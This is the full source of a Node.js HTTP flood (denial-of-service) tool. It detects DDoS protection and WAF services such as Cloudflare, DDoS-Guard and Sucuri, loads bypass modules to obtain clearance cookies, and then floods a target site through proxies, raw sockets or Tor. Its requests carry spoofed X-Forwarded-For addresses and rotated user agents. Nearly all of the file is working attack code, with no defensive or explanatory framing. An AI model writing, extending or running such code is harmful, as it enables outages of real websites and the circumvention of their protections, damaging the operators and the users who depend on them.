const request = require('request'),
    cloudscraper = require('cloudscraper'),
    net = require('net'),
    URL = require('url'),
    fs = require('fs'),
	path = require('path'),
    urlStatusCode = require('url-status-code'),
    progressbar = require('string-progressbar'),
    delay = ms => new Promise(resolve => setTimeout(resolve, ms)),
    requestJar = request.jar(),
    reqCookie = request.defaults({
        jar: requestJar
    }),
    reqBypass = cloudscraper.defaults({
        jar: requestJar
    }),
    randomWords = require('./random-words'),
    bypasses = require('./bypasses/'),
    events = require('events'),
    ignoreNames = ['TypeError', 'RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'ReferenceError', 'Error', 'DeprecationWarning'],
    ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'SELF_SIGNED_CERT_IN_CHAIN', 'ERR_INVALID_OPT_VALUE_ENCODING', 'DEP0123'];
    var i = 0;
    var sleep = require('sleep');
    const statuscodedisplay = process.argv[16];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).setMaxListeners(0);

function INIT(workerData) {
// Logging:

console.log('\x1b[0m{')
console.log('    \x1b[0mtarget:\x1b[32m', workerData.target)
console.log('    \x1b[0mproxies:\x1b[32m', workerData.proxies.length)
console.log('    \x1b[0muserAgents:\x1b[32m', workerData.userAgents.length)
console.log('    \x1b[0mreferers:\x1b[32m', workerData.referers.length)
console.log('    \x1b[0mduration:\x1b[32m', process.argv[4])
console.log('    \x1b[0mmethod:\x1b[32m', workerData.method)
console.log('    \x1b[0mbody:\x1b[32m', workerData.body)
console.log('    \x1b[0mratelimit:\x1b[32m', process.argv[12])
console.log('    \x1b[0mcookie:\x1b[32m', workerData.cookie)
console.log('    \x1b[0mmode:\x1b[32m', workerData.mode)
console.log('\x1b[0m}')
console.log('\n')
console.log('Valid proxies: ', workerData.proxies.length)
urlStatusCode(workerData.target, (error, statusCode) => {
    if (error) {
      //console.error(error)
    } else {
      logger('Status code: '+ statusCode)
    }
  })


    const STATE = {
        running: false,
        protection: false,
        expire: 0,
        last: {},
        firewall: false,
        firewalls: [],
        available: ['ddosguard', 'cloudflare', 'blazingfast', 'sucuri', 'stormwall', 'ovh', 'pipeguard']
    }

    const PROPS = []; // All of the settings combined;
    global.l7 = {};
    l7.target = workerData.target.replace("%RANDOM%", randomWords());
    l7.httpmode = workerData.httpmode;
    l7.parsed = URL.parse(workerData.target);
    l7.mode = workerData.mode;
    l7.refer2 = workerData.refer;
    if (workerData) {
        l7.opt = workerData;
    } else {
        l7.opt = {
            method: "GET", // HTTP METHOD
            body: false // DEFAULT REQUQEST'S BODY = NO BODY;
        }
    }

    var ATTACK, LOADER, BYPASS = false;

    function initMode() {
        switch (l7.mode) {
            case 'proxy':
                LOADER = flooder.init_proxy;
                ATTACK = flooder.proxy;
                break;
            case 'request':
                LOADER = flooder.init_request;
                ATTACK = flooder.request;
                break;
            case 'websocket':
                LOADER = flooder.init_ws;
                ATTACK = flooder.ws;
                break;
            case 'raw':
                ATTACK();
                l7.raw = true;
                break;
        }
    }


    if (l7.mode == 'raw') {
        ATTACK = function () {
            let dua = flooder.randomUA;
            STATE.running = true; // From now and so, script considered running;
            STATE.expire = Date.now() + workerData.duration;

            setTimeout(() => {
                console.log('Attack finished');
                process.exit(4);
            }, STATE.expire - Date.now());
            console.log('Starting proxyless :: ', l7.target);
            setInterval(() => {
                reqCookie({
                    method: l7.opt.method,
                    url: l7.target,
                    headers: {
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': dua,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'Keep-Alive'
                    }
                });
            }, 1);
        }
        initMode();
    }

    class Bypass {
        constructor(config) {
	//logger('Detected WAF :: ', l7.firewall)
            initMode();
            /*if (!l7.firewall) { // If there's no firewall; set it to be true (to "fake" firewall and use universal;)
                l7.firewall = true;
            }*/
            if (l7.firewall) {
                if (STATE.available.includes(l7.firewall[0])) {
                    BYPASS = this.load(l7.firewall[0]);
                } else {
                    BYPASS = this.load('browser_engine');
                }

                if (l7.firewall[1] == false && !BYPASS) {
                    workerData.proxies.forEach(async p => {
                        let dobj = {
                            proxy: 'http://' + p,
                            userAgent: flooder.randomUA
                        };

                        await cloudscraper({
                            url: l7.target.replace("%RANDOM%", randomWords()),
                            method: "GET",
                            proxy: dobj.proxy,
                            jar: true,
                            followAllRedirects: true,
                            maxRedirects: 20,
                            headers: {
                                'User-Agent': dobj.userAgent
                            }
                        }, async (err, res) => {
                            if (err) return false;
                            if (res.request.headers.cookie) {
                                dobj.cookie = res.request.headers.cookie;
                            }
                            await LOADER(dobj);
                        });
                    })
                    return;
                }

                workerData.proxies.forEach(p => {
                    let dobj = {
                        userAgent: flooder.randomUA,
                        proxy: 'http://' + p
                    }
                    BYPASS(dobj.proxy, dobj.userAgent, async cookie => {
                        dobj.cookie = cookie;
                        await LOADER(dobj);
                    });
                });
            } else {
                workerData.proxies.forEach(p => {
                    let dobj = {
                        proxy: 'http://' + p,
                        userAgent: flooder.randomUA,
                        cookie: false
                    };
                    reqBypass({
                        method: "GET",
                        url: l7.target.replace("%RANDOM%", randomWords()),
                        proxy: dobj.proxy,
                        headers: {
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': dobj.userAgent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9'
                        }
                    }, async (err, res, body) => {
                        if (err) return false;
                        if (res.request.headers.cookie) {
                            dobj.cookie = res.request.headers.cookie;
                        }
                        await LOADER(dobj);
                    });
                });

            }
        }

        load(bypassModule) {
            return bypasses[bypassModule]();
        }
    }

    function coinFlip() {
        return (Math.floor(Math.random() * 2) == 0);
    }

    randomByte = function () {
        return Math.round(Math.random() * 256);
    }

    randomIp = function () {
        var ip = randomByte() + '.' +
            randomByte() + '.' +
            randomByte() + '.' +
            randomByte();
        if (isPrivate(ip)) return randomIp();
        return ip;
    }

    isPrivate = function (ip) {
        return /^10\.|^192\.168\.|^172\.16\.|^172\.17\.|^172\.18\.|^172\.19\.|^172\.20\.|^172\.21\.|^172\.22\.|^172\.23\.|^172\.24\.|^172\.25\.|^172\.26\.|^172\.27\.|^172\.28\.|^172\.29\.|^172\.30\.|^172\.31\./.test(ip);
    }


    privateIps = [
        '10.0.0.0',
        '10.255.255.255',
        '172.16.0.0',
        '172.31.255.255',
        '192.168.0.0',
        '192.168.255.255'
    ];

    publicIps = [
        '0.0.0.0',
        '255.255.255.255',
    ];

    class Flood {
        cosntructor(config) {

        }

        get randomReferer() {
            return workerData.referers[~~(Math.random() * workerData.referers.length)]
        }

        get randomProxy() {
            return 'http://' + workerData.proxies[~~(Math.random() * workerData.proxies.length)]
        }

        get randomUA() {
            return workerData.userAgents[~~(Math.random() * workerData.userAgents.length)]
        }

        get randomSpoof() {
            return `${randomIp()}, ${randomIp()}`;
        }

        init(e) {
            if (l7.target.indexOf("%RANDOM%") !== -1) {
                e.target = l7.target.replace(/%RANDOM%/g, randomWords());
            }
            if (l7.opt.body && l7.opt.body.indexOf("%RANDOM%") !== -1) {
                e.body = l7.opt.body.replace(/%RANDOM%/g, randomWords());
            }
            if (l7.opt.cookie) {
                l7.opt.cookie = l7.opt.cookie.replace(/%RANDOM%/g, randomWords());
                if (e.cookie && e.cookie.length >= 4) {
                    e.cookie += '; ' + l7.opt.cookie
                } else {
                    e.cookie = l7.opt.cookie
                };
            }
            return e;
        }

        init_proxy(c) {
            c = flooder.init(c);
            c.proxy = c.proxy.split('://')[1].split(':');
            ATTACK(c);
        }

        init_request(d) {
d = flooder.init(d);
            d.url = d.target.replace("%RANDOM%", randomWords()) || l7.target.replace("%RANDOM%", randomWords());
            delete d.target;
            d.method = l7.opt.method;
            d.timeout = 10e3;
            //d.insecure = true;
            d.headers = {
                'cf-cache-status': 'DYNAMIC',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6',
                'Cache-Control': 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
                'Pragma': 'no-cache',
                'Connection': 'Keep-Alive',
                'Referer': l7.opt.refer || (coinFlip() ? flooder.randomReferer : d.url.replace("%RANDOM%", randomWords())),
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': d.userAgent,
                'Cookie': d.cookie,
                'expect-ct': 'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"',
                'X-Forwarded-For': flooder.randomSpoof
            }
            if (d.cookie == 0) {
                d.headers['Cookie'] = d.cookie;
                //console.log("Cookie: ", d.cookie)
                fs.writeFileSync("cookie.txt", "URL:",d.url," --> COOKIE:",d.cookie);
            }
            if (l7.opt.headers) {
                Object.keys(l7.opt.headers).forEach(aHeader => {
                    console.log(l7.opt.headers)
                    d.headers[aHeader] = l7.opt.headers[aHeader];
                });
            }
            d.proxy = d.proxy;
            PROPS.push(d);
        }

        proxy(a) {
            let stop = Date.now() + 120e3,
                req = () => {
                    if (Date.now() >= stop) {
                        if (netSock.readable && !netSock.destroyed) {
                            resetted ? false : ATTACK(a), resetted = true, netSock.end();
                            netSock.end();
                        }
                        return netSock.destroy();
                    }
                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${a.target.replace("%RANDOM%", randomWords()) || l7.target.replace("%RANDOM%", randomWords())} ${l7.httpmode}\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nReferer: ${l7.opt.refer || (coinFlip() ? flooder.randomReferer : l7.target)}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                }
            var resetted = false,
                netSock = {};

            netSock = net.connect({
                host: a.proxy[0],
                port: a.proxy[1]
            }, async () => {
                for (let j = 0; j < a.proxy[0].length * 5; j++) {
                    await req();
                }
                netSock.on('data', async () => {
                    resetted ? false : ATTACK(a), resetted = true;
                    netSock ? (await req()) : false;
                });
            }).once('disconnect', () => {
                resetted ? netSocket.end() : ATTACK(a), resetted = true;
                return;
            });
        }

        request(b) {
            reqCookie(b);
        }
    }

    // Initialize the flooding system: ( After bypass received cookies, start attacking ~ )
    let flooder = new Flood({
        threads: 30
    });

    class starter {
        init() {
            // Setup flooding interval;

            if (l7.opt.ratelimit) {
                let aprop = 0;

                function sendreq() {
                    reqCookie(PROPS[aprop]);
                    aprop++;
                    if (aprop >= PROPS.length) aprop = 0;
                }
                setInterval(sendreq, 30); // 30ms fight rate limits. Loop through each proxy, more proxies less traffic per ip.
            } else {
                function randomreq() {
                    reqCookie(PROPS[~~(Math.random() * PROPS.length)]);
                }
                for (let v = 0; v < 2; v++) {
                    setInterval(randomreq);
                }
            }
        }
    }

    let Starter = new starter();

    // Initialize Auto protection detection:

    class AutoDetect {
        constructor(cb) {
            this.cback = cb;
        }

        detect() {
            function detectplz() {
                if (STATE.running) return false;
                let dproxy = flooder.randomProxy,
                    dUA = flooder.randomUA;
                request({
                    method: "GET",
                    url: l7.target.replace("%RANDOM%", randomWords()),
                    gzip: true,
                    followAllRedirects: true,
                    maxRedirects: 20,
                    agentOptions: {
                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
                    },
                    timeout: 80e3,
                    proxy: dproxy,
                    headers: {
                        'Connection': 'keep-alive',
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': flooder.randomUA,
                        'Referer': l7.opt.refer || (coinFlip() ? flooder.randomReferer : l7.target),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        		'cache-control': 'max-age=0',
       		 	'upgrade-insecure-requests': '1',
        		'sec-fetch-dest': 'document',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'sec-fetch-site': 'none',
        		'sec-fetch-mode': 'navigate',
        		'sec-fetch-user': '?1',
        		'accept-language': 'en-US,en;q=0.9',
                        'X-Forwarded-For': flooder.randomSpoof
                    }
                }, (err, res, body) => {
                    if (STATE.running) return false;
                    if (err || !res || !body || res.headers['proxy-connection'] || body.indexOf('Maximum number of open connections reached') !== -1 || body.indexOf('<title>ERROR: The requested URL could not be retrieved</title>') !== -1 || body.indexOf('<title>This is a SOCKS Proxy, Not An HTTP Proxy</title>') !== -1 || body.indexOf('<title>Tor is not an HTTP Proxy</title>') !== -1) {
                        return; // Proxy failed, or an error occured, retry.
                    }

                    if (res.headers['content-length']) {
                        if (res.headers['content-length'] >= 52428800) {
                            return process.exit(8);
                        }
                    }

                    if (res.headers.server == 'cloudflare') {
                        if (res.statusCode == 503 && (body.indexOf("Checking your browser before accessing</") !== -1 || body.indexOf("document.getElementById('challenge-form');") !== -1)) {
                            //Cloudflare UAM Detected:
                            STATE.firewall = ['cloudflare', 'uam'];
                        } else if (res.statusCode == 403 && (res.headers['cf-chl-bypass'] || body.indexOf('<noscript id="cf-captcha-bookmark" class="cf-captcha-info">') !== -1)) {
                            //Cloudflare Captcha Detected:
                            if (res.headers['cf-chl-bypass']) {
                                STATE.firewall = ['cloudflare', 'captcha', true];
                            } else {
                                STATE.firewall = ['cloudflare', 'captcha', false];
                            }
                        } else if (res.statusCode == 403) {
                            reqBypass.get({
                                url: l7.target.replace("%RANDOM%", randomWords()),
                                proxy: dproxy,
                                headers: {
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': dUA,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                }
                            }, (err, res, body) => {
                                if (err && err.name == 'CaptchaError') {
                                    STATE.firewall = ['cloudflare', 'captcha', false];
                                }
                            });
                        } else {
                            STATE.firewall = ['cloudflare', false]
                        }
                    } else if (res.headers['server'] == 'Sucuri/Cloudproxy' || body.indexOf("{},u,c,U,r,i,l=0") !== -1 && res.headers['x-sucuri-id'] && body.startsWith('<html><title>You are being redirected...</title>')) {
                        STATE.firewall = ['sucuri', 'jschl'];
                    } else if (body.indexOf("<!DOCTYPE html><html><head><title>DDOS-GUARD</title>") !== -1) {
                        STATE.firewall = ['ddosguard', '5sec'];
                        STATE.ratelimit = true;
                    } else if (res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('__ddg_=')) {
                        STATE.firewall = ['ddosguard', 'proxy'];
                    } else if (res.headers.server && res.headers['x-hw'] && res.headers.server == 'fbs' && res.headers['x-hw'].startsWith('1')) {
                        STATE.firewall = ['stackpath', false];
                    } else if (res.statusCode == 200 && ['nginx', 'openresty'].indexOf(res.headers.server) !== -1 && res.headers['set-cookie']) {
                        if (res.headers['set-cookie'][0].startsWith('rcksid=')) {
                            STATE.firewall = ['blazingfast', '5sec'];
                        } else if (res.headers['set-cookie'][0].startsWith('BlazingWebCookie=')) {
                            STATE.firewall = ['blazingfast', '5sec2'];
                        }
                    } else if (body.indexOf(';document.cookie="CyberDDoS_') !== -1) {
                        if (body.indexOf('<div w3-include-html="/5s.html"></div>') !== -1) {
                            STATE.firewall = ['cyberddos', '5sec'];
                        } else {
                            STATE.firewall = ['cyberddos', 'silent'];
                        }
                    } else if (res.headers['x-firewall-protection'] && res.headers['x-firewall-protection'] == 'True' && res.statusCode == 200 && res.headers['x-firewall-port'] && res.headers.expires == '0') {
                        STATE.firewall = ['stormwall', 'js'];
                    } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 589 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
                        STATE.firewall = ['nooder', 'cookie'];
                    } else if (res.statusCode == 200 && body.startsWith('<html><body><script>setTimeout(eval(function(p,a,c,k,e,d){e=function(c){') && body.endsWith('Please enable JavaScript and Cookies in your browser.</p></noscript></body></html>')) {
                        STATE.firewall = ['ovh', 'js'];
                    } else if (res.statusCode == 200 && body.indexOf('function setCookie() {document.cookie = "PipeGuard=') !== -1 && body.startsWith('<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Human Verification</title>')) {
                        STATE.firewall = ['pipeguard', 'SetCookie'];
                    }
                    STATE.firewalls.push(STATE.firewall);
                    STATE.last.body = body;
                    STATE.last.res = res;
                });
            }


    const ports = [
        '91',
        '92',
        '93',
        '94',
        '95',
        '96',
        '97',
        '98',
        '99',
        '910',
        '911',
    ];

    function randomInt(n) {
        return Math.floor(Math.random() * n);
    }

    function randomPort() {
        return ports[randomInt(ports.length)];
    }

    function torconfig() {
        let dua = flooder.randomUA;
        let port = randomPort();
        setInterval(() => {
            tr.request({
                url: l7.target.replace("%RANDOM%", randomWords()),
                agentClass: Agent,
                agentOptions: {
                    socksHost: '127.0.0.1',
                    socksPort: port
                },
                headers: {
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': dua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
            }, function(err, res, body) {})
        }, 4);
    }

    if (l7.mode == 'tor') {
        STATE.running = true; // From now and so, script considered running;
        STATE.expire = Date.now() + workerData.duration;
        setTimeout(() => {
            console.log('Attack finished');
            process.exit(4);
        }, STATE.expire - Date.now());
        console.log('Starting tor flood :: ', l7.target);
        for (let v = 0; v < 1; v++) {
            torconfig()
        }
    }

            let tryrun = setInterval(() => {
                STATE.running ? clearInterval(tryrun) : setImmediate(detectplz);
                if (STATE.firewalls.length >= 1000) {
                    //After getting protection detected results; We start flooding and bypassing:
                    STATE.running = true; // From now and so, script considered running;
                    STATE.expire = Date.now() + workerData.duration;

                    if (l7.mode == 'request') {
                        let tryINIT = () => {
                            if (PROPS.length > 0) {
                                Starter.init();
                            } else {
                                setTimeout(tryINIT, 1000);
                            }
                        }
                        tryINIT();
                    }
                    setTimeout(() => {
                        console.log('Attack finished.');
                        process.exit(4);
                    }, STATE.expire - Date.now());
                    clearInterval(tryrun);
                    for (var i = 0; i < STATE.firewalls.length; i++) {
                        if (Array.isArray(STATE.firewalls[i])) {
                            switch (STATE.firewall[0]) {
                                case 'cloudflare':
                                    STATE.firewall[1] = STATE.firewalls[i][1] !== 'captcha' ? STATE.firewalls[i][1] : STATE.firewall[1];
                                    if (l7.mode !== 'request' && ['captcha', 'uam'].indexOf(STATE.firewall[1]) !== -1) {
                                        l7.mode = 'request';
                                    }
                                    if (STATE.firewall.length == 3) {
                                        if (!STATE.firewall[2]) {
                                            console.warn('[cloudflare-bypass]: The target is not supporting privacypass');
                                            process.exit(34);
                                        }
                                    }
                                    break;
                                case 'ddosguard':
                                    STATE.firewall[1] = STATE.firewalls[i][1] !== 'proxy' ? STATE.firewalls[i][1] : STATE.firewall[1];
                                    break;
                            }
                            if (!STATE.firewall) STATE.firewall = STATE.firewalls[i];
                        }
                    }
                    l7.firewall = STATE.firewall;
                    if (l7.firewall[0] == 'cloudflare') {
                    }
                    this.cback() // Start bypassing :: After bypassed start attacking using "ATTACK" function;
                } else {
                    if (STATE.firewalls.length === 0){
                    } else {
                    //console.log("Firewall length: "+ STATE.firewalls.length);
                }
                }
            });
        }
    }

    if (!l7.raw) {
        let Detection = new AutoDetect(() => {
            new Bypass();
        });

        Detection.detect();
    }
}

let masterCallbacks = {
    0: res => { new INIT(res); }
}

function ID() {
    return Math.random().toString(36).substr(2, 9);
}

process.on('message', msg => {
    let dfunc = masterCallbacks[0];
    if (dfunc) {
        dfunc.call(null, msg);
        setTimeout(() => {
            delete masterCallbacks[0];
        }, 5e3);
    }
});

